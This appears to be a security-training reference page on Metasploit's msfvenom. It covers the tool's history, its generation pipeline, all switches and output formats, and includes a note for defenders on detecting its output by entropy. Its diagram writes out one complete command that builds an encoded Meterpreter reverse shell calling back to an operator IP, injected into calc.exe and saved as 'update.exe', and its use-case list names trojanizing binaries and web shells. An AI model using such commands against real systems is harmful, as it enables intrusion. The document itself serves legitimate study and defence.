# Metasploit — msfvenom — Overview

> 🔴 **Red Flag Principle:** msfvenom doesn't touch a target at all — it's a **local generator**. What it hands an operator is a file (or raw bytes) that eventually runs on the target, and that file has a structural tell independent of which payload, encoder, or output format was chosen: **raw shellcode injected into a compiler-built template produces a sharp entropy contrast between the injected code region and the rest of the binary.** A small, single-section anomaly of high-entropy code sitting inside an otherwise normal-looking, low-entropy PE/ELF/Mach-O is the single strongest static-triage signal for anything msfvenom built, and it survives almost every evasion flag the tool exposes (custom `-x` template, `-k` thread injection, alternate output format) because the injection mechanic itself is what creates the contrast.

## Contents
- [History](#history)
- [How It Works](#how-it-works)
- [Techniques / Protocols Used](#techniques--protocols-used)
- [Command-Line Switches — Quick Reference](#command-line-switches--quick-reference)
- [Output Format Reference](#output-format-reference)
- [Quick Use-Case List](#quick-use-case-list)
- [Prerequisites](#prerequisites)

---

## History

msfvenom was introduced by Rapid7 on **May 24, 2011** ([`Introducing msfvenom`](https://www.rapid7.com/blog/post/2011/05/24/introducing-msfvenom/)) as a single tool combining the standalone `msfpayload` (payload generation) and `msfencode` (payload encoding) utilities that Metasploit had shipped separately up to that point. The two tools ran in parallel with msfvenom for several years while it matured; Rapid7 formally announced their retirement in a **December 9, 2014** blog post ([`Good-bye msfpayload and msfencode`](https://www.rapid7.com/blog/post/2014/12/09/good-bye-msfpayload-and-msfencode/)), and on **June 8, 2015** `msfpayload` and `msfencode` were removed from the Metasploit Framework repository, leaving msfvenom as the sole supported payload-generation CLI — a fact the tool's own official documentation still states verbatim: *"It replaced msfpayload and msfencode on June 8th 2015."* ([`How to use msfvenom`](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html))

msfvenom ships as a top-level executable script (`msfvenom`) in Rapid7's [`github.com/rapid7/metasploit-framework`](https://github.com/rapid7/metasploit-framework) repository — same repo, same maintainer, same open-source BSD-style license as the rest of the Framework (see `../00 - Metasploit Overview.md`). It is not a separate project; it's a thin CLI wrapper (`msfvenom`, ~540 lines of Ruby as of this writing) around the Framework's own `Msf::PayloadGenerator` class, which is why every payload, encoder, and platform msfvenom can generate is exactly the set registered in the Framework's module tree — nothing exists in msfvenom that doesn't already exist as a `payload`/`encoder`/`nop` module.

## How It Works

```
Operator command line                              Msf::PayloadGenerator pipeline
──────────────────────                              ───────────────────────────────
msfvenom -p windows/x64/meterpreter/reverse_tcp
  LHOST=10.10.14.1 LPORT=4444
  -e x86/shikata_ga_nai -i 3
  -x calc.exe -k
  -f exe-only -o update.exe

1. Payload selection ───────────────────────────▶  Loads the named payload module
                                                       (e.g. windows/x64/meterpreter/
                                                       reverse_tcp) from the Framework's
                                                       module tree — same module a
                                                       msfconsole exploit handler would use
2. Datastore options applied ───────────────────▶  LHOST/LPORT (or any module-specific
   (positional VAR=VAL arguments)                     option) set on the module before
                                                       generation — reverse payloads with
                                                       no LHOST given default to the
                                                       operator box's own source address
3. Raw payload bytes generated ─────────────────▶  Module's generate() produces the
                                                       raw machine code / stager for the
                                                       requested arch+platform
4. Encoding (optional: -e/-i, or auto-triggered
   by -b) ───────────────────────────────────────▶  Wraps the raw bytes in a decoder
                                                       stub (e.g. shikata_ga_nai's
                                                       polymorphic XOR-additive-feedback
                                                       encoder), repeated -i times —
                                                       changes the byte pattern, NOT the
                                                       underlying payload's behavior
5. Template injection (optional: -x, -k) ───────▶  Default: msf/data/templates/ ships
                                                       Framework-provided templates per
                                                       platform/arch. -x swaps in an
                                                       operator-supplied executable
                                                       instead. -k additionally preserves
                                                       the template's own original code
                                                       path and runs the payload as a
                                                       NEW THREAD alongside it, rather
                                                       than overwriting the entry point —
                                                       reliable mainly on older x86
                                                       Windows targets per official docs
6. Output formatting (-f) ──────────────────────▶  Msf::Util::EXE.to_executable_fmt_formats
                                                       (exe/dll/elf/macho/msi/war/jar/...)
                                                       wraps the (possibly encoded,
                                                       possibly template-injected) bytes
                                                       in the requested container — OR
                                                       Msf::Simple::Buffer.transform_formats
                                                       (raw/c/python/powershell/base64/...)
                                                       emits the bytes as source/shellcode
                                                       for a custom loader instead of a
                                                       standalone executable
7. Write to disk (-o) or stdout ────────────────▶  update.exe written locally — msfvenom
                                                       never contacts the target; delivery
                                                       is an entirely separate step
```

Step-by-step:

1. **Payload selection (`-p`)** — msfvenom loads a payload module by its Framework path. Naming follows the same `platform/arch/payload` convention documented in `../00 - Metasploit Overview.md`'s Payloads table: **singles** (self-contained, e.g. `windows/x64/shell_reverse_tcp`), **staged** (slash-joined, e.g. `windows/x64/meterpreter/reverse_tcp` — small stager, full Meterpreter DLL fetched over the connection), and **stageless** (underscore-joined, e.g. `windows/x64/meterpreter_reverse_tcp` — the entire payload ships in this one file, no second download). Which shape to pick is one of the first operational decisions covered in `02 - Hands-On Use Cases.md`.
2. **Datastore options** — any trailing `VAR=VAL` arguments (`LHOST=...`, `LPORT=...`, etc.) set options on the loaded payload module exactly as `set` would inside `msfconsole`. If the payload name matches `/reverse/` and no `LHOST` was supplied, msfvenom auto-fills it with the operator box's own outbound source address (verified in the tool's own argument-parsing source).
3. **Encoding (`-e`, `-i`, or auto-triggered by `-b`)** — wraps the raw payload bytes in a decoder stub from an `encoder` module (e.g. `x86/shikata_ga_nai`, a polymorphic XOR-additive-feedback encoder), optionally repeated `-i <count>` times. Official Rapid7 documentation states this directly: *"encoding isn't really meant to be used a real AV evasion solution"* — consistent with `../Meterpreter/05 - Detection and Hunting.md`'s coverage of the same point: encoding changes the delivered file's static bytes, nothing else, and modern EDR's behavioral detection is unaffected by it. msfvenom's part in this is strictly *generation* — invoking the encoder module and writing out the result; the encoder's actual evasion mechanics (how `shikata_ga_nai`'s polymorphic engine works, what a decoder-stub signature looks like, why iteration count doesn't meaningfully help) are covered in depth in the sibling `../Encoders and Evasion/` sub-tool folder, not duplicated here.
4. **Bad-character avoidance (`-b`)** — supplying a byte list msfvenom must not emit (common in exploit-development contexts where certain bytes terminate a string or break a parser) automatically selects a compatible encoder to satisfy the constraint, without the operator separately specifying `-e`.
5. **Template injection (`-x`, `-k`)** — by default, msfvenom pulls a minimal Framework-provided template from `msf/data/templates/` per platform/architecture. `-x <path>` substitutes an operator-chosen executable instead — the payload either overwrites the template's entry point (default) or, with `-k`, runs as a **new thread** alongside the template's original, unmodified code path, so the wrapped program still appears to function normally to a user who opens it. Per Rapid7's own how-to guide, `-k` is "only reliable for older Windows machines such as x86 Windows XP" — don't present it as a dependable technique against modern Windows. A documented gotcha: injecting into a 64-bit Windows template requires `-f exe-only`, not `-f exe` — `exe` on x64 goes through a different code path that doesn't support template substitution the same way.
6. **Output formatting (`-f`)** — the final container format. Two distinct format families exist in the Framework source (`Msf::Util::EXE.to_executable_fmt_formats` vs. `Msf::Simple::Buffer.transform_formats` — see [Output Format Reference](#output-format-reference) below for the full, verified list of both) and picking the wrong one for the goal is a common operator mistake worth knowing as a blue teamer: an `exe`/`elf`/`dll`/`macho`/`war` is a runnable/deployable file; a `raw`/`c`/`python`/`powershell` output is shellcode or source text meant to be embedded in something else (a custom loader, a script).
7. **Write output (`-o`)** — saves to the given path, or streams to stdout for piping into a second msfvenom invocation (chained encoding, historically how `msfpayload | msfencode` worked and still supported).

msfvenom performs **zero network activity of its own** — no target connection, no listener. Pairing the generated payload with something that catches its callback (`exploit/multi/handler` in `msfconsole`, covered in `../Meterpreter/02 - Hands-On Use Cases.md`'s "Initial Staged Shell via an Exploit Handler") is a separate, subsequent step.

## Techniques / Protocols Used

| Layer | Detail |
|---|---|
| Generation | Pure local module invocation — `Msf::PayloadGenerator` wraps a `payload` module's `generate()`, no network I/O |
| Encoding | Encoder modules (e.g. `x86/shikata_ga_nai` — polymorphic XOR-additive-feedback), chosen via `-e` or auto-selected by `-b` |
| Template injection | Entry-point overwrite (default `-x`) or new-thread injection alongside the original template code (`-x -k`) |
| Output containers | PE (`exe`/`exe-only`/`exe-small`/`exe-service`/`dll`/`msi`), ELF (`elf`/`elf-so`), Mach-O (`macho`/`osx-app`), web-shell/script formats (`asp`/`aspx`/`war`/`jsp`/`vbs`/`hta-psh`/`psh`), archive/container (`jar`/`axis2`), and raw/source transforms (`raw`/`c`/`csharp`/`python`/`powershell`/`base64`/etc.) — full verified list in [Output Format Reference](#output-format-reference) |
| Delivered payload's own protocol | Whatever the chosen payload module implements post-execution — e.g. Meterpreter's TLV over `reverse_tcp`/`reverse_https`/`bind_tcp`, fully covered in `../Meterpreter/01 - Overview.md`, not re-derived here |

## Command-Line Switches — Quick Reference

Verified directly against the current `msfvenom` script and its own `--help` output in the official [`rapid7/metasploit-framework`](https://github.com/rapid7/metasploit-framework) repository — not from memory or older cheat sheets, several of which are missing flags added since (`--service-name`, `--sec-name`, `--encrypt*`, `--pad-nops`, `-t`/`--timeout`, `--refresh-cache`) or list flags no longer accurate.

**Payload / module selection**

| Switch | Plain-English meaning |
|---|---|
| `-p, --payload <payload>` | The payload module to generate, by Framework path (e.g. `windows/x64/meterpreter/reverse_tcp`). `-p -` (or `-p stdin`) reads a **custom** raw payload from stdin instead of using a Framework module — useful for encoding/re-formatting shellcode from elsewhere |
| `-l, --list <type>` | Enumerate available modules: `payloads`, `encoders`, `nops`, `platforms`, `archs`, `encrypt`, `formats`, or `all` |
| `--list-options` | Show the selected `-p` payload's standard, advanced, and evasion options (equivalent to `show options` on the same module inside `msfconsole`) |
| `--refresh-cache` | Rebuild the Framework's module metadata cache from disk before listing/generating — useful after adding custom modules |

**Architecture / platform / format**

| Switch | Plain-English meaning |
|---|---|
| `-a, --arch <arch>` | Target CPU architecture (x86, x64, etc.) for the payload and any encoder |
| `--platform <platform>` | Target OS platform (windows, linux, osx, android, php, java, etc.) |
| `-f, --format <format>` | Output container/transform format — `--list formats` enumerates the full set (see below) |
| `-o, --out <path>` | Write the generated payload to this file instead of stdout |
| `-v, --var-name <name>` | Custom variable name for source-code output formats (`c`, `csharp`, `python`, etc.) — cosmetic, but a non-default name can defeat naive string-based YARA rules targeting the default variable name |

**Encoding / obfuscation**

| Switch | Plain-English meaning |
|---|---|
| `-e, --encoder <encoder>` | Wrap the payload in the named encoder's decoder stub (`--list encoders` to enumerate) |
| `-i, --iterations <count>` | Re-encode the payload this many times — layers decoder stubs, does **not** meaningfully improve AV/EDR evasion per Rapid7's own documentation |
| `-b, --bad-chars <list>` | Bytes the payload must not contain (e.g. `'\x00\xff'`) — msfvenom auto-selects a compatible encoder to satisfy this, primarily an exploit-dev concern (buffer constraints), not an AV-evasion feature |
| `--smallest` | Try every available encoder and keep whichever produces the smallest output — a size optimization, not an evasion one |
| `--encrypt <value>` | Encrypt (not just encode) the shellcode with the named cipher (`--list encrypt` to enumerate) — requires a custom stub/loader on the receiving end to decrypt it at runtime, since msfvenom's own output formats don't auto-generate a decryption wrapper |
| `--encrypt-key <value>` / `--encrypt-iv <value>` | Key / IV material for `--encrypt` |

**Template / injection**

| Switch | Plain-English meaning |
|---|---|
| `-x, --template <path>` | Use an operator-supplied executable as the output container instead of the Framework's default `msf/data/templates/` file — the core "trojanize a real binary" mechanic |
| `-k, --keep` | Combined with `-x`: preserve the template's own original behavior and run the payload as a **separate thread** instead of overwriting the entry point. Per official docs, reliable mainly on older x86 Windows targets, not modern Windows |
| `-c, --add-code <path>` | Include an **additional** win32 shellcode file alongside the primary payload |
| `--service-name <value>` | Service name to use when generating a service-binary format (`exe-service`) — also flips on `sub_method` handling for x86 binaries internally |
| `--sec-name <value>` | Custom PE section name for large Windows binaries (default: random 4-character string) |

**Size / constraint**

| Switch | Plain-English meaning |
|---|---|
| `-n, --nopsled <length>` | Prepend a NOP sled of this many bytes — classic exploit-dev landing-zone padding |
| `--pad-nops` | Treat `-n`'s value as the **total** desired payload size, auto-computing how much NOP padding to add rather than a fixed prepend |
| `-s, --space <length>` | Maximum size of the final resulting payload |
| `--encoder-space <length>` | Maximum size of the *encoded* payload specifically (defaults to `-s` if unset) |

**Misc**

| Switch | Plain-English meaning |
|---|---|
| `-t, --timeout <seconds>` | How long to wait when reading a custom payload from stdin (default 30s; 0 disables the timeout) |
| `-h, --help` | Show usage |

## Output Format Reference

`-f`/`--format` draws from **two separate arrays in the Framework source**, verified directly against `lib/msf/util/exe.rb`'s `to_executable_fmt_formats` and `lib/msf/base/simple/buffer.rb`'s `transform_formats` — this is the operational distinction the How It Works step 6 diagram above refers to, spelled out in full rather than summarized, since a blue teamer reading a `-f` value out of a shell-history line needs to know which bucket it falls in to reason about what the resulting file actually *is*.

**Executable/container formats** (`Msf::Util::EXE.to_executable_fmt_formats`) — each produces a file meant to be run (or deployed/loaded) directly on the target platform:

| Format | What it produces |
|---|---|
| `exe`, `exe-small`, `exe-only` | Windows PE executable — `exe` picks a full-featured template, `exe-small` a minimal one, `exe-only` skips template wrapping entirely (**required** instead of `exe` for x64 `-x` template injection — see Prerequisites) |
| `exe-service` | Windows PE built to satisfy the Service Control Manager's expectations, so it can be installed and started as a service (pairs with `--service-name`) |
| `dll` | Windows DLL (32- or 64-bit, selected by `-a`) |
| `msi`, `msi-nouac` | Windows Installer package — `msi-nouac` attempts to suppress the UAC elevation prompt on install |
| `elf`, `elf-so` | Linux ELF executable, or ELF shared object for `LD_PRELOAD`/injection-style delivery |
| `macho` | macOS Mach-O executable |
| `osx-app` | macOS `.app` application bundle |
| `asp`, `aspx`, `aspx-exe` | Classic ASP or ASP.NET web-shell-style page for IIS |
| `jsp`, `war` | Java Server Page, or a full WAR (Web Application Archive) for deployment to a Java servlet container (Tomcat, JBoss) — the standard shape for compromising an exposed admin console like Tomcat Manager |
| `axis2` | Apache Axis2 web-service archive |
| `jar` | Java archive |
| `vba`, `vba-exe`, `vba-psh` | Office macro (VBA) source, or a macro that drops/launches an embedded EXE or PowerShell |
| `vbs`, `loop-vbs` | VBScript, or a VBScript that loops/persists |
| `hta-psh` | HTML Application (`.hta`) wrapping a PowerShell launcher |
| `psh`, `psh-cmd`, `psh-net`, `psh-reflection` | Standalone PowerShell script, a one-line PowerShell command, a .NET-flavored PowerShell wrapper, or a PowerShell reflective-loader script |
| `python-reflection` | Python reflective-loader script |
| `ducky-script-psh` | Rubber Ducky-style keystroke-injection script that types out a PowerShell payload |

**Transform formats** (`Msf::Simple::Buffer.transform_formats`) — each emits the raw payload bytes as source code, shellcode, or an encoded blob meant to be **embedded in something else** (a custom loader, an exploit's buffer), not run standalone:

| Format | What it produces |
|---|---|
| `raw` | Naked shellcode bytes — no wrapping at all |
| `c`, `csharp`, `java`, `rust`/`rustlang`, `go`/`golang`, `nim`/`nimlang`, `zig` | A byte array in the named language's source syntax, variable-named via `-v` |
| `python`/`py`, `perl`/`pl`, `ruby`/`rb`, `bash`/`sh` | A byte array/string literal in the named scripting language |
| `powershell`/`ps1` | A PowerShell byte-array/command construct |
| `vbapplication`, `vbscript` | VBA or VBScript source variants of the transform (distinct from the executable-container `vba`/`vbs` formats above) |
| `js_be`, `js_le` | JavaScript byte array, big- or little-endian |
| `masm` | x86 assembly (MASM syntax) byte array |
| `base32`, `base64`, `hex`, `octal` | Encoded text representations of the raw bytes |
| `num`, `dword`/`dw` | C-style numeric/DWORD array representations |

`--list formats` prints the current, version-accurate union of both arrays directly from the running Framework install — treat the tables above as a verified snapshot, not a substitute for checking a specific install if the exact set matters (e.g. building tooling against it).

## Quick Use-Case List

- Enumerating available payloads, encoders, formats, and platforms before building anything (`-l payloads`/`-l encoders`/`-l formats`, `--list-options`)
- Basic single (non-staged) reverse-shell executable for a quick callback
- Staged vs. stageless Meterpreter payload selection depending on egress reliability (see `../Meterpreter/02 - Hands-On Use Cases.md`)
- Cross-platform payload generation — Windows EXE/DLL, Linux ELF, macOS Mach-O
- Android payload generation (a documented gotcha: there is **no dedicated `apk` output format** — Android payloads use `-f raw` and the `.apk` bytes are produced directly by the payload module itself, saved via `-o payload.apk`)
- PHP web-shell-style Meterpreter payload for a vulnerable web application (`php/meterpreter/reverse_tcp`, same `-f raw` pattern as Android, saved with a `.php` extension)
- HTTPS-wrapped Meterpreter (`reverse_https`) for egress through TLS-inspecting proxies or environments that block plain TCP callbacks
- Java WAR/JSP payload (`-f war`/`-f jsp`) for compromising an exposed Java application-server admin console (e.g. Tomcat Manager)
- Encoding for basic byte-pattern obfuscation against naive static AV (with the explicit caveat it is not real EDR evasion — see the cross-link below)
- Template/`-x` injection into a legitimate-looking executable, with `-k` to preserve the template's original behavior
- Custom bad-character avoidance (`-b`) for exploit-development shellcode
- Reformatting externally-sourced raw shellcode via stdin (`-p -`) with explicit `-a`/`--platform`, since there's no module to infer them from
- Raw shellcode / source-code output (`-f raw`, `-f c`, `-f python`, `-f powershell`, etc.) for embedding in a custom loader rather than running msfvenom's own container
- Pairing generated output with an `exploit/multi/handler` listener (see `../Meterpreter/02 - Hands-On Use Cases.md`)
- Payload size minimization (`--smallest`, `-s`/`--encoder-space`) for constrained delivery mechanisms
- Stageless payload generation specifically to avoid Meterpreter's second-stage network dependency
- Generating a Windows service-binary payload (`-f exe-service`, `--service-name`) for chaining into service-based lateral-movement tooling
- Encrypting (not just encoding) shellcode via `--encrypt`/`--encrypt-key`/`--encrypt-iv` for a custom decrypting loader
- Chaining multiple msfvenom invocations by piping `raw` output through successive encoders — the historical `msfpayload | msfencode` workflow, still supported

Full walkthroughs with commands and MITRE ATT&CK mapping for every item above live in `02 - Hands-On Use Cases.md`. msfvenom's own role in the encoding step is generation-time only — the actual AV/EDR-bypass mechanics of `shikata_ga_nai` and other encoders are covered in depth in the sibling `../Encoders and Evasion/` sub-tool folder, not re-derived here.

## Prerequisites

| Requirement | Notes |
|---|---|
| Metasploit Framework installed | msfvenom is a script inside the Framework install, not a separate download — see `../00 - Metasploit Overview.md`'s Install & Setup |
| No target reachability required to *generate* | Generation is entirely local; reachability only matters once the payload is delivered and, for reverse payloads, the handler needs to be network-reachable from the target |
| A matching listener for delivery | Reverse payloads need a `multi/handler` (or equivalent) reachable at the configured `LHOST:LPORT` before execution, or the callback has nothing to connect to |
| A template file, for `-x` | Must exist on the operator's local filesystem and be a valid executable for the target platform/architecture — the x64-Windows `-f exe-only` gotcha above applies |
| Architecture/platform match | `-a`/`--platform` must be compatible with the chosen `-e` encoder and `-p` payload, or generation fails outright |
